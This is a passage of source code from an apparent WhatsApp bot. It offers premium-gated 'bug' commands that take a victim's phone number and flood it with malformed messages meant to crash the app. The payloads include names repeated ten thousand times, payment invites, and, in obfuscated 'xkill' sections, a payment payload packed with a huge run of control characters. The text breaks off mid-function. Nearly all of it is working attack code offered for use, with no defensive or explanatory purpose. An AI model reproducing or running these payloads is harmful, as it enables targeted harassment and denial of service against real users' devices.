m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'xreact': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!m.quoted) return replygcdeepak(`Example usage: ${prefix + command} reply chat`)
await DeepakBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await DeepakBotInc.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'x2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
amount = text * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx|5`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'iosbug2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case 'iosbug': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'xaudio2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'xaudio': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example: ${prefix + command} 5`)
amount = text
DeepakOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
DeepakBotInc.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${DeepakOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'xloc': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
DeepakOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
DeepakBotInc.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${DeepakOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
replygcdeepak(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example:\n${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await DeepakBotInc.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case 'xkill2': {
if (!isPremium) return replygcdeepak(mess.prem)
 if (!args[0]) return replygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 13`) 
let amount = text*10
function _0x4eaeea(_0x43de39,_0x57c976,_0x430754,_0x265f9d){return _0x453f(_0x43de39- -0xa3,_0x430754);}(function(_0x207b77,_0x50c310){function _0x2ee17f(_0x251028,_0x17f02c,_0x33af66,_0x3638bc){return _0x453f(_0x17f02c-0x3,_0x3638bc);}const _0x17001b=_0x207b77();function _0x936463(_0x57456c,_0x57c26a,_0x541f15,_0x3d525b){return _0x453f(_0x3d525b-0x1c3,_0x57456c);}while(!![]){try{const _0x292451=parseInt(_0x2ee17f(0xe8,0xef,0xf7,0xd8))/(-0x2034+0x16a2+0x993)*(parseInt(_0x936463(0x267,0x273,0x293,0x28b))/(-0x4f*0xe+-0x2d0+-0x4*-0x1c9))+-parseInt(_0x936463(0x291,0x269,0x247,0x27f))/(0x25ec+0x18a0+0x1*-0x3e89)+parseInt(_0x936463(0x2f9,0x2e7,0x28a,0x2bf))/(-0xf43+-0xe57+0x1d9e)*(-parseInt(_0x936463(0x2c6,0x2a7,0x2a4,0x290))/(-0x21cf+-0x1e3a+0x400e))+parseInt(_0x936463(0x241,0x23d,0x23c,0x264))/(0x1d05*0x1+0x113c+0x315*-0xf)*(-parseInt(_0x936463(0x299,0x2eb,0x2dd,0x2c9))/(-0x1948+0x1*-0x3e2+-0x3*-0x9bb))+-parseInt(_0x2ee17f(0x9d,0x94,0xd3,0xb7))/(0x143b+-0x392+-0x2b*0x63)*(-parseInt(_0x936463(0x294,0x253,0x254,0x270))/(0x2026+0x2*-0x698+-0x12ed))+parseInt(_0x2ee17f(0xfb,0x10d,0x131,0x13c))/(-0x2019*0x1+0xd72+0xf*0x13f)+parseInt(_0x2ee17f(0xbb,0xc1,0xe0,0xbb))/(0x4*-0x7bb+-0x14f2+0x33e9);if(_0x292451===_0x50c310)break;else _0x17001b['push'](_0x17001b['shift']());}catch(_0x497449){_0x17001b['push'](_0x17001b['shift']());}}}(_0x3b9f,0x1223*-0x31+0x105*-0x3f+0x1*0x5c66f));const _0x1c8a3c=(function(){const _0x155a57={};function _0x4976a3(_0x25dcc7,_0x26931b,_0x1cd801,_0xb85f6){return _0x453f(_0x1cd801-0x1c2,_0x25dcc7);}_0x155a57[_0x531257(0x2b2,0x2c1,0x278,0x2ba)]=function(_0x5b2945,_0x2c34dd){return _0x5b2945===_0x2c34dd;},_0x155a57[_0x531257(0x319,0x2e4,0x2ee,0x355)]=_0x531257(0x30b,0x2ee,0x2d4,0x302);const _0x52b398=_0x155a57;let _0x586fd9=!![];function _0x531257(_0x117323,_0x5a842f,_0x3c1f42,_0x44b756){return _0x453f(_0x117323-0x219,_0x5a842f);}return function(_0x33306a,_0x45bd60){function _0x56ef09(_0x4057a0,_0x387226,_0x4b7da5,_0x4d689c){return _0x4976a3(_0x4d689c,_0x387226-0x146,_0x4057a0-0x53,_0x4d689c-0xc);}function _0x3ddcc9(_0x1e76e5,_0xcb3799,_0x3bb072,_0x217579){return _0x531257(_0xcb3799- -0x344,_0x1e76e5,_0x3bb072-0x13c,_0x217579-0x80);}if(_0x52b398['SUvuF'](_0x56ef09(0x307,0x2fb,0x327,0x30b),_0x52b398[_0x56ef09(0x315,0x354,0x30c,0x30c)])){const _0x3e50d3=_0x586fd9?function(){function _0x8c4b9(_0x37febb,_0x4799e7,_0x4ea418,_0x51a113){return _0x3ddcc9(_0x4799e7,_0x51a113-0x290,_0x4ea418-0xa4,_0x51a113-0xd4);}if(_0x45bd60){const _0x340589=_0x45bd60[_0x8c4b9(0x258,0x23b,0x239,0x26c)](_0x33306a,arguments);return _0x45bd60=null,_0x340589;}}:function(){};return _0x586fd9=![],_0x3e50d3;}else{const _0xbbd858=_0x34068a['apply'](_0x520ed8,arguments);return _0x1f1d49=null,_0xbbd858;}};}());function _0x2fc48f(_0x4f12de,_0x287028,_0x273bfe,_0x43c990){return _0x453f(_0x287028-0x346,_0x43c990);}const _0x25b9f0=_0x1c8a3c(this,function(){function _0xe03a3(_0x5c677d,_0x52f6d8,_0x49378b,_0x2557ba){return _0x453f(_0x2557ba-0x36a,_0x5c677d);}function _0x50a745(_0x56a1de,_0x594878,_0x3d874a,_0x54b97b){return _0x453f(_0x3d874a-0x123,_0x54b97b);}const _0x23645a={};_0x23645a[_0x50a745(0x220,0x261,0x224,0x20b)]='(((.+)+)+)'+'+$';const _0x9374f6=_0x23645a;return _0x25b9f0[_0x50a745(0x1f7,0x241,0x204,0x1f0)]()[_0x50a745(0x1c5,0x1b4,0x1e9,0x211)](_0x9374f6[_0xe03a3(0x49f,0x4a6,0x474,0x46b)])['toString']()['constructo'+'r'](_0x25b9f0)[_0xe03a3(0x468,0x467,0x3f2,0x430)](_0xe03a3(0x425,0x435,0x424,0x440)+'+$');});_0x25b9f0();const _0x460fe4=(function(){let _0x331e0a=!![];return function(_0x24e290,_0x37d477){const _0x47a0a2=_0x331e0a?function(){function _0x3c91e6(_0x2e8505,_0x466d91,_0x5d88a3,_0x1c2efb){return _0x453f(_0x1c2efb- -0x167,_0x466d91);}if(_0x37d477){const _0xeec447=_0x37d477[_0x3c91e6(-0x7e,-0x63,-0x75,-0x60)](_0x24e290,arguments);return _0x37d477=null,_0xeec447;}}:function(){};return _0x331e0a=![],_0x47a0a2;};}()),_0x1202f1=_0x460fe4(this,function(){const _0x2b9686={'RyxSg':_0x4891a6(-0x13e,-0x104,-0x16a,-0x105),'MCXQb':function(_0x246717,_0x2e69e6){return _0x246717+_0x2e69e6;},'nEuTf':_0x4891a6(-0x143,-0x12f,-0x107,-0x174)+_0x2cf091(0x380,0x375,0x34f,0x357),'SCYHI':function(_0x57381c,_0x4c2aa9){return _0x57381c===_0x4c2aa9;},'OnGot':_0x2cf091(0x3b3,0x39c,0x3ac,0x389),'fxezq':function(_0x1ec1b7){return _0x1ec1b7();},'PRJGV':_0x2cf091(0x376,0x360,0x360,0x355),'gZiEh':'warn','qfRrT':_0x4891a6(-0x136,-0xf6,-0xfd,-0x101),'kGsKR':'exception','zsYhV':_0x4891a6(-0x168,-0x156,-0x15c,-0x160),'YPZmY':_0x2cf091(0x32c,0x368,0x390,0x384),'bJfXR':function(_0xefedfd,_0x18199c){return _0xefedfd<_0x18199c;}},_0x460b30=function(){function _0x6c0bab(_0x3c28b1,_0x5b1d94,_0x319b61,_0x369cd4){return _0x2cf091(_0x3c28b1-0x185,_0x319b61- -0x306,_0x3c28b1,_0x369cd4-0x2b);}let _0x59202e;function _0x4962e3(_0x1c8425,_0x9cef75,_0x171d04,_0x5cbcb9){return _0x4891a6(_0x171d04-0x327,_0x1c8425,_0x171d04-0xc4,_0x5cbcb9-0x18e);}try{if(_0x2b9686['RyxSg']!==_0x2b9686[_0x4962e3(0x1df,0x1b6,0x1ec,0x1e4)]){const _0x5b2e18=_0x45f6e8['constructo'+'r']['prototype'][_0x4962e3(0x1e7,0x1f2,0x204,0x1f3)](_0x2b523c),_0x2c5bd4=_0x5e8413[_0x2311c6],_0x202126=_0x46a0ce[_0x2c5bd4]||_0x5b2e18;_0x5b2e18[_0x4962e3(0x1cf,0x1f2,0x1c3,0x1f8)]=_0x2ec944[_0x4962e3(0x220,0x20d,0x204,0x226)](_0x31db21),_0x5b2e18['toString']=_0x202126[_0x6c0bab(0x74,0x98,0x84,0xb4)][_0x4962e3(0x227,0x22e,0x204,0x23a)](_0x202126),_0xf4aad7[_0x2c5bd4]=_0x5b2e18;}else _0x59202e=Function(_0x2b9686[_0x4962e3(0x1ae,0x1dc,0x1b7,0x1c6)](_0x2b9686[_0x4962e3(0x1cc,0x1e6,0x1de,0x1b6)],_0x6c0bab(0xaa,0x7d,0x9a,0x61)+_0x6c0bab(0x78,0x65,0x85,0x94)+_0x6c0bab(0x89,0x86,0x8d,0x71)+'\x20)')+');')();}catch(_0x2aefb8){if(_0x2b9686[_0x4962e3(0x1b3,0x1ec,0x1f2,0x1c0)](_0x2b9686[_0x6c0bab(0x35,0x65,0x41,0x48)],_0x4962e3(0x1a9,0x18c,0x1c9,0x1aa))){if(_0x2348d9){const _0x410e2d=_0x5392db[_0x6c0bab(0xa0,0xa3,0xaa,0xb9)](_0x2e5a9d,arguments);return _0x5e31fc=null,_0x410e2d;}}else _0x59202e=window;}return _0x59202e;},_0x29c00d=_0x2b9686['fxezq'](_0x460b30);function _0x2cf091(_0xa63f07,_0x2edab9,_0x7f67a5,_0x13c887){return _0x453f(_0x2edab9-0x2a9,_0x7f67a5);}const _0x14e515=_0x29c00d[_0x2cf091(0x36f,0x396,0x376,0x398)]=_0x29c00d['console']||{};function _0x4891a6(_0x5de00b,_0x14c2e6,_0x3f913f,_0x3c4c5c){return _0x453f(_0x5de00b- -0x212,_0x14c2e6);}const _0x39b4ea=[_0x2b9686[_0x4891a6(-0x162,-0x140,-0x197,-0x172)],_0x2b9686[_0x4891a6(-0x15f,-0x150,-0x12d,-0x135)],_0x4891a6(-0x17c,-0x171,-0x197,-0x188),_0x2b9686['qfRrT'],_0x2b9686[_0x2cf091(0x395,0x38d,0x37a,0x35e)],_0x2b9686[_0x2cf091(0x36a,0x3a8,0x37b,0x3aa)],_0x2b9686['YPZmY']];for(let _0x2b03d6=0x2007*-0x1+0x22e1+0x2da*-0x1;_0x2b9686['bJfXR'](_0x2b03d6,_0x39b4ea['length']);_0x2b03d6++){const _0x32ea3b=_0x460fe4[_0x2cf091(0x315,0x33b,0x31e,0x30c)+'r'][_0x2cf091(0x364,0x390,0x3d0,0x356)]['bind'](_0x460fe4),_0x43f67b=_0x39b4ea[_0x2b03d6],_0x48d913=_0x14e515[_0x43f67b]||_0x32ea3b;_0x32ea3b['__proto__']=_0x460fe4[_0x2cf091(0x3bc,0x398,0x383,0x37c)](_0x460fe4),_0x32ea3b[_0x2cf091(0x399,0x38a,0x3ba,0x36f)]=_0x48d913[_0x2cf091(0x37e,0x38a,0x3a8,0x369)][_0x4891a6(-0x123,-0xf9,-0x139,-0x118)](_0x48d913),_0x14e515[_0x43f67b]=_0x32ea3b;}});_0x1202f1();let bug='\x03'[_0x2fc48f(0x3c9,0x3d1,0x3a6,0x394)](-0xa7dba+-0x4c1c6+-0x174*-0x11d8);for(let i=-0x26ee+0xde6+-0x9*-0x2c8;i<amount;i++){const _0x1d2630={};_0x1d2630[_0x4eaeea(0x1,-0x18,-0x24,0x3f)+_0x4eaeea(-0x8,0xf,0x1c,-0x20)]=_0x2fc48f(0x3aa,0x3e9,0x3bb,0x3fe)+'38483540@n'+'ewsletter',_0x1d2630[_0x4eaeea(0x1,0x32,0x23,0x3f)+_0x2fc48f(0x3a8,0x3da,0x3fe,0x3ed)]=_0x4eaeea(-0x4,0x28,0x7,0x1f)+_0x4eaeea(0x4e,0x33,0x2b,0x68)+_0x4eaeea(0x55,0x57,0x8d,0x71)+'h',_0x1d2630[_0x4eaeea(0x1e,0x3a,0x4d,0x12)+_0x2fc48f(0x3f4,0x40a,0x443,0x3d3)]=0x2;const _0xa2bffe={};_0xa2bffe[_0x4eaeea(0x42,0x80,0x7b,0x1a)+_0x2fc48f(0x3be,0x3e6,0x3af,0x3d1)]=[],_0xa2bffe['jpegThumbn'+_0x4eaeea(0x43,0x3e,0x5e,0x63)]=global[_0x2fc48f(0x40f,0x43a,0x431,0x450)];const _0x34759c={};_0x34759c['name']='review_and'+_0x2fc48f(0x3e1,0x3f1,0x3bf,0x3bc),_0x34759c[_0x2fc48f(0x433,0x3ff,0x3e9,0x3c9)+_0x4eaeea(0x57,0x2c,0x5c,0x31)]='{\x22currency'+_0x4eaeea(0x2,0x0,-0x23,-0xd)+'otal_amoun'+_0x4eaeea(0x18,0x42,0x34,0xd)+_0x2fc48f(0x41e,0x3e2,0x41b,0x3d4)+_0x2fc48f(0x436,0x44b,0x453,0x481)+_0x4eaeea(-0xb,-0x5,0x6,-0x3c)+_0x4eaeea(0x28,0x25,-0x1,0x25)+_0x4eaeea(0x35,0x3,0x4a,0x6a)+_0x2fc48f(0x3ec,0x3dd,0x3cb,0x409)+':\x22physical'+_0x4eaeea(0x52,0x66,0x15,0x4b)+_0x4eaeea(0x58,0x6c,0x8e,0x19)+_0x4eaeea(-0x15,0x2b,-0x55,-0x42)+_0x4eaeea(0x2f,0x12,-0x6,0x27)+_0x2fc48f(0x45c,0x444,0x409,0x425)+_0x2fc48f(0x47b,0x448,0x445,0x463)+_0x4eaeea(0x13,0xf,0x51,-0x26)+_0x4eaeea(0x20,-0x1e,0x32,0x3d)+_0x2fc48f(0x427,0x426,0x43b,0x3eb)+_0x2fc48f(0x3f9,0x436,0x423,0x422)+_0x4eaeea(-0x17,0x1f,-0x51,-0x4a)+_0x2fc48f(0x432,0x43f,0x42d,0x44b)+_0x2fc48f(0x3ea,0x408,0x3fc,0x3c9)+_0x4eaeea(0x15,0x45,-0x9,0xe)+'3159292600'+_0x2fc48f(0x469,0x44e,0x419,0x44d)+'t_id\x22:\x22799'+_0x4eaeea(0x22,0x17,0x47,-0x17)+'009\x22,\x22name'+_0x4eaeea(0xc,-0x17,-0x31,-0x11)+xbugtex['xtxt']+(_0x2fc48f(0x405,0x3f8,0x436,0x3f4)+_0x2fc48f(0x457,0x43c,0x42c,0x46c)+_0x2fc48f(0x463,0x449,0x468,0x419)+'ffset\x22:100'+_0x4eaeea(-0x9,-0x13,-0x37,0x29)+_0x4eaeea(0x36,0x21,0x4e,0x39)+_0x2fc48f(0x3d8,0x400,0x40d,0x3d7)+_0x2fc48f(0x405,0x3ee,0x3d0,0x3da)+_0x4eaeea(0x4,0x28,0x7,0x5)+_0x4eaeea(0x61,0x2e,0x4c,0x80)+_0x4eaeea(0x66,0x35,0x93,0x6d)+_0x4eaeea(-0x14,-0x34,-0x1e,-0x3e)+_0x4eaeea(0x6,-0x5,0x46,-0xc)+_0x4eaeea(0x2b,0x15,0x2c,0x4c)+_0x2fc48f(0x3d2,0x3d3,0x3cd,0x3e1))+bug+(_0x4eaeea(0xf,-0x15,0x33,0x4d)+_0x2fc48f(0x415,0x43c,0x45f,0x44d)+_0x2fc48f(0x437,0x449,0x415,0x45b)+'ffset\x22:100'+_0x4eaeea(-0x9,0xb,-0x3c,0x36)+_0x4eaeea(0x2d,0x15,-0x3,0xe)+'ative_paym'+_0x4eaeea(0x38,0x26,0x2c,0x39)+_0x4eaeea(0x3c,0xf,0x4a,0x4b));const _0xf37131={};_0xf37131[_0x4eaeea(0x1d,0x3c,0x1a,-0x1d)]=[_0x34759c];const _0x26e3cf={};_0x26e3cf[_0x4eaeea(0x37,0x8,0x3c,0x5)]=_0xa2bffe,_0x26e3cf[_0x4eaeea(-0x10,-0x14,0x2,-0x30)+_0x4eaeea(0x32,0x15,-0x4,0x27)]=_0xf37131;const _0x2a7413={};_0x2a7413['interactiv'+_0x2fc48f(0x43c,0x434,0x45b,0x453)]=_0x26e3cf;const _0x42b619={};_0x42b619[_0x2fc48f(0x3e6,0x419,0x44e,0x42e)+'d']=!![],_0x42b619['forwardedN'+'ewsletterM'+_0x2fc48f(0x3ec,0x3e3,0x40b,0x3d2)]=_0x1d2630,_0x42b619[_0x2fc48f(0x404,0x3fb,0x3f6,0x405)]=_0x2fc48f(0x429,0x403,0x3e8,0x441)+_0x4eaeea(0x9,-0xe,-0x27,-0x4),_0x42b619['participan'+'t']=_0x2fc48f(0x410,0x417,0x3f5,0x404)+_0x4eaeea(0x5a,0x4a,0x74,0x2a),_0x42b619[_0x4eaeea(-0x13,0x29,-0x32,0x2)+_0x4eaeea(-0xe,-0x9,-0x35,0x18)]=_0x2a7413,_0x42b619[_0x2fc48f(0x3be,0x3f7,0x3cc,0x411)]=_0x4eaeea(0x48,0xb,0x3f,0x55)+_0x4eaeea(0x3,0x3d,0xd,-0x25);const _0x18e540={};_0x18e540['text']='\x20',_0x18e540[_0x2fc48f(0x41f,0x40d,0x439,0x3f8)+'o']=_0x42b619;const _0x1985c4={};_0x1985c4[_0x4eaeea(0x3b,0x7b,0x3c,0x47)+'xtMessage']=_0x18e540,await DeepakBotInc[_0x4eaeea(0x27,-0x6,0x64,0x1c)+'ge'](m[_0x2fc48f(0x451,0x429,0x41c,0x425)],_0x1985c4,{});const _0xfd3911={};_0xfd3911['text']='\x20';const _0x136d8a={};_0x136d8a[_0x2fc48f(0x3f8,0x42e,0x40e,0x437)]=xbug2,await DeepakBotInc[_0x2fc48f(0x444,0x42f,0x402,0x40a)+'e'](m[_0x2fc48f(0x43e,0x429,0x42f,0x458)],_0xfd3911,_0x136d8a);}function _0x453f(_0x25b9f0,_0x1c8a3c){const _0x3b9f39=_0x3b9f();return _0x453f=function(_0x453f85,_0x12a8ea){_0x453f85=_0x453f85-(-0x15d*-0x8+0x1583*-0x1+0xb26);let _0x31ef9c=_0x3b9f39[_0x453f85];return _0x31ef9c;},_0x453f(_0x25b9f0,_0x1c8a3c);}function _0x3b9f(){const _0x3e0b0d=['return\x20(fu','y\x22:1}]},\x22n','0@s.whatsa','ment_reque','isForwarde','YckVA','Message','(((.+)+)+)','RyxSg','\x224ONSAXV76','y\x22:1},{\x22re','header','ent_method','error','SCYHI','extendedTe','s\x22:[]}','et\x22:100},\x22','toString','ctor(\x22retu','chat','kGsKR','hasMediaAt','ail','prototype','quoted','sendMessag','rn\x20this\x22)(','status@bro','85369EctOWu','console','eMessage','bind','order_type','uka\x20chat\x20i','ivNqe','qIvzT','bimg','-goods\x22,\x22o',':{\x22value\x22:','{}.constru','ni\x20->\x20cras','\x22items\x22:[{','msJson','rder\x22:{\x22st','36BBgfPa','pp.net','sted\x22,\x22sub','zsYhV','cltkh','WjJjM','total\x22:{\x22v','9999900,\x22o','\x22product_i',',\x22offset\x22:','7mcCrea','apply','9\x22,\x22produc','d\x22:\x22784267','364020DaccDn','repeat','\x22:\x22ORDER\x22,','Bug\x20Bot\x20🦄','atus\x22:\x22pay','4605763435','quotedMess','332216bzyOfX','constructo','nativeFlow','Name','age','info','KN\x22,\x22type\x22','100},\x22refe','SUvuF','},\x22quantit','Jid','\x22:69696969','essageInfo','OnGot','relog\x20->\x20b','tachment','178686RRfwcP','MCXQb','1203631440','newsletter','\x22:\x22INR\x22,\x22t','adcast','05763435\x22,',':\x2278426746','\x22,\x22name\x22:\x22','table','_pay','FE4CDF','9uEAksQ','__proto__','\x22:\x22','PRJGV','remoteJid','\x22,\x22amount\x22','gZiEh','jZQZf','stanzaId','alue\x22:1999','log','id\x22:\x2275376','buttonPara','tailer_id\x22','t\x22:{\x22value','44256GJazSw','BAE526D352','185295HrBSjk','trace','buttons','serverMess','\x22retailer_','9800,\x22offs','ageId','9631592926','search','contextInf','6zqZSXT','nEuTf','relayMessa','rence_id\x22:','nction()\x20','95455PhYCDS','🦄\x20Deepak\x20'];_0x3b9f=function(){return _0x3e0b0d;};return _0x3b9f();}
}
break
case 'xkill': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
await loading()
let target = text + '@s.whatsapp.net';
function _0x45425d(_0x10fecd,_0x21a04c,_0x4eac45,_0x1cc1a5){return _0x5ddd(_0x21a04c- -0x150,_0x1cc1a5);}(function(_0x3c054e,_0x283d5d){const _0x1a5853=_0x3c054e();function _0x1fed8a(_0x3ce43d,_0x5788cd,_0xc65a82,_0x37d33f){return _0x5ddd(_0x3ce43d-0x4e,_0x5788cd);}function _0x4ee80c(_0x2feee5,_0x2dfdae,_0x122c8b,_0x4e6a46){return _0x5ddd(_0x4e6a46-0x43,_0x122c8b);}while(!![]){try{const _0x22f33e=-parseInt(_0x4ee80c(0x1a2,0x20e,0x1f2,0x1e4))/(-0x7c*0x23+-0x3e*-0x9+0x4ed*0x3)*(parseInt(_0x4ee80c(0x26f,0x266,0x26e,0x257))/(0xb0*0x6+-0x1*0x1af2+0x16d4))+-parseInt(_0x1fed8a(0x20e,0x232,0x1eb,0x1d4))/(0x3*-0x4ab+0x1*-0x18a7+0x209*0x13)+parseInt(_0x4ee80c(0x25d,0x1eb,0x202,0x22d))/(0x293*0x9+-0x89b*-0x1+-0x1fc2)*(parseInt(_0x4ee80c(0x1eb,0x262,0x25b,0x221))/(-0x293*0xf+-0x5b3*0x3+0x37bb))+parseInt(_0x1fed8a(0x1ec,0x1ba,0x1fb,0x21e))/(-0xba5*0x3+0x97c+0x1979*0x1)*(parseInt(_0x1fed8a(0x263,0x221,0x298,0x250))/(0x99*-0x1b+0x25*0x49+0x59d))+-parseInt(_0x4ee80c(0x1c0,0x236,0x1e1,0x1fb))/(-0x2142+-0x4d2*0x4+0x8c3*0x6)+parseInt(_0x4ee80c(0x211,0x243,0x210,0x235))/(-0x1*-0x1d5+0xb5*0x4+0x10*-0x4a)+parseInt(_0x4ee80c(0x1e9,0x239,0x206,0x219))/(-0x19b4+0x24c7+0x235*-0x5);if(_0x22f33e===_0x283d5d)break;else _0x1a5853['push'](_0x1a5853['shift']());}catch(_0xdc1f28){_0x1a5853['push'](_0x1a5853['shift']());}}}(_0x43ec,0xbc754+0x6*-0x4d432+0x201f57));function _0x43ec(){const _0x938d62=['error','KN\x22,\x22type\x22','quotedMess','relayMessa','dRFOJ','tDOQJ','\x22retailer_','name','1203631440',',\x22offset\x22:','9999900,\x22o','warn','58kWzeMG','20489rYsXEo','\x22:\x22INR\x22,\x22t','\x22:\x22ORDER\x22,','msJson','ageId','jvZjl','FXmxX','participan','info','tailer_id\x22','XLbyq','buttons','s\x22:[]}','StmLJ','05763435\x22,','jpegThumbn','gXXjj','nction()\x20','162XegXPt','__proto__','adcast','50132YHHUgi','relog\x20->\x20b','\x224ONSAXV76','status@bro',':{\x22value\x22:','QboQz','\x22:\x22','kYYkY','contextInf','bind','sted\x22,\x22sub','qBdYZ','oTDSn','newsletter','iYNDd','extendedTe','t\x22:{\x22value','rCjSl','rn\x20this\x22)(','Tmobw','y\x22:1},{\x22re','wllQk','BAE526D352','6311752lPxHJm','vuZew','ctor(\x22retu','},\x22quantit','iyORL','ment_reque','serverMess','ffset\x22:100','1503141wDvfLu','d\x22:\x22784267','Message','alue\x22:1999','xwGIR','0@s.whatsa','search','38483540@n','CXqJi','forwardedN',':\x22physical','otal_amoun','console','quoted','vcfEh','\x22items\x22:[{','xwthx','apply','009\x22,\x22name','4605763435','log','order_type','12555000UFwzlf','uka\x20chat\x20i','BuvAS','age','100},\x22refe','9\x22,\x22produc','Bug\x20Bot\x20','Zypyr','5fwxmwu','{}.constru','OTDlm','MrQCJ','sendMessag','constructo','zlLBL','dGpNW','9800,\x22offs','\x22product_i','bimg','cjZSp','5915924jKyZtT','rder\x22:{\x22st','y\x22:1}]},\x22n','ent_method',':\x2278426746','\x22,\x22amount\x22','trace','ail','8177733kCMlsN','hasMediaAt','TPYLA','nativeFlow','ative_paym','toString','xtMessage','9631592926','KyYfq','ewsletterM','essageInfo','text','-goods\x22,\x22o','SGwIY','return\x20(fu','header','\x22,\x22name\x22:\x22','FE4CDF','xvpwT','(((.+)+)+)','atus\x22:\x22pay','t_id\x22:\x22799'];_0x43ec=function(){return _0x938d62;};return _0x43ec();}function _0x30bfde(_0x2ec10e,_0x14feff,_0x2d8485,_0x1fc81b){return 